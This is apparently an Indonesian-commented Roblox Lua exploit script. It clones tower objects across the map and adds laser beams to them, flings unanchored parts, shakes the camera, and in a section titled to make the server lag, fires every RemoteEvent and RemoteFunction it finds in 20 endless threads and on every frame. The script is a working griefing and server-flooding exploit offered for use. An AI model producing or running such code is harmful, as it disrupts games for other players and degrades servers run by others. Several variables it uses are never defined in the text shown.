-- 2. CARI TOWER TITAN ASLI + DUPLIKASI
-- ===========================================
local function findTitanTowers()
    local towers = {}
    
    local function scanForTowers(obj)
        if not obj then return end
        -- Cari berdasarkan keyword
        if obj.Name:lower():find("tower") or 
           obj.Name:lower():find("titan") or 
           obj.Name:lower():find("laser") or
           obj.Name:lower():find("cannon") or
           obj.Name:lower():find("turret") then
            table.insert(towers, obj)
        end
        -- Scan child
        for _, child in pairs(obj:GetChildren()) do
            scanForTowers(child)
        end
    end
    
    scanForTowers(Workspace)
    return towers
end

-- Fungsi tambah laser ke tower
local function addLaserEffect(tower)
    -- Cari attachment point
    local attachment = Instance.new("Attachment")
    attachment.Parent = tower
    attachment.Position = Vector3.new(0, 30, 0)
    
    -- Beam utama (laser tebal)
    local beam = Instance.new("Beam")
    beam.Parent = tower
    beam.Attachment0 = attachment
    beam.Attachment1 = attachment
    beam.Width0 = 5
    beam.Width1 = 5
    beam.Texture = "rbxasset://textures/particles/sparkles_main.dds"
    beam.TextureSpeed = 20
    beam.TextureLength = 5
    beam.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
    })
    beam.FaceCamera = true
    beam.LightInfluence = 0
    
    -- Beam kecil berputar
    local beam2 = beam:Clone()
    beam2.Parent = tower
    beam2.Width0 = 2
    beam2.Width1 = 2
    beam2.Color = ColorSequence.new(Color3.fromRGB(255, 0, 255))
    
    -- Tambah point light
    local light = Instance.new("PointLight")
    light.Parent = tower
    light.Range = 80
    light.Brightness = 10
    light.Color = Color3.fromRGB(255, 0, 0)
end

-- Duplikat tower
local function duplicateTowers()
    local realTowers = findTitanTowers()
    print("🔍 Ditemukan " .. #realTowers .. " tower asli")
    
    if #realTowers > 0 then
        -- Duplikat tower asli 50x
        for i = 1, 50 do
            for _, originalTower in ipairs(realTowers) do
                local clone = originalTower:Clone()
                clone.Parent = Workspace
                
                -- Random posisi di seluruh map
                local pos = Vector3.new(math.random(-500, 500), math.random(0, 200), math.random(-500, 500))
                
                -- Set posisi
                local success, err = pcall(function()
                    if clone:IsA("BasePart") then
                        clone.Position = pos
                    elseif clone:FindFirstChildWhichIsA("BasePart") then
                        local primary = clone:FindFirstChildWhichIsA("BasePart")
                        primary.Position = pos
                    end
                end)
                
                addLaserEffect(clone)
                wait(0.02)
            end
        end
    else
        -- Kalo gak nemu tower asli, bikin tower palsu massal
        for i = 1, 200 do
            local tower = Instance.new("Part")
            tower.Size = Vector3.new(10, 60, 10)
            tower.Position = Vector3.new(math.random(-500, 500), math.random(0, 200), math.random(-500, 500))
            tower.Anchored = true
            tower.CanCollide = false
            tower.BrickColor = BrickColor.new("Bright red")
            tower.Material = Enum.Material.Neon
            tower.Parent = Workspace
            
            addLaserEffect(tower)
            wait(0.01)
        end
    end
end

local function glitchMap()
    -- Loop semua part di workspace
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            -- Random velocity biar pada berguncang
            obj.Velocity = Vector3.new(math.random(-500, 500), math.random(500, 1000), math.random(-500, 500))
            obj.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
        end
    end
    
    -- Efek glitch di kamera (client-side)
    RunService.RenderStepped:Connect(function()
        local cam = Workspace.CurrentCamera
        cam.CFrame = cam.CFrame * CFrame.Angles(math.random(-0.05, 0.05), math.random(-0.05, 0.05), 0)
    end)
end

-- 4. REMOTE SPAM (BIAR SERVER LAG)
-- ===========================================
local function findRemotes()
    local remotes = {}
    
    local function scan(obj)
        if not obj then return end
        for _, child in pairs(obj:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(remotes, child)
            else
                scan(child)
            end
        end
    end
    
    scan(ReplicatedStorage)
    scan(Players)
    scan(Workspace)
    
    return remotes
end

local function startServerSpam()
    for i = 1, 20 do -- 20 thread parallel
        spawn(function()
            while true do
                for _, remote in ipairs(allRemotes) do
                    if remote and remote.Parent then
                        for _, args in ipairs(spamArgs) do
                            pcall(function()
                                if remote:IsA("RemoteEvent") then
                                    remote:FireServer(unpack(args))
                                elseif remote:IsA("RemoteFunction") then
                                    coroutine.wrap(function()
                                        remote:InvokeServer(unpack(args))
                                    end)()
                                end
                            end)
                        end
                    end
                end
                wait()
            end
        end)
    end
    
    -- Spam ekstra pake RenderStepped
    RunService.RenderStepped:Connect(function()
        for _, remote in ipairs(allRemotes) do
            if remote and remote.Parent and remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer("heartbeat", "destroy", tick())
                end)
            end
        end
    end)
end
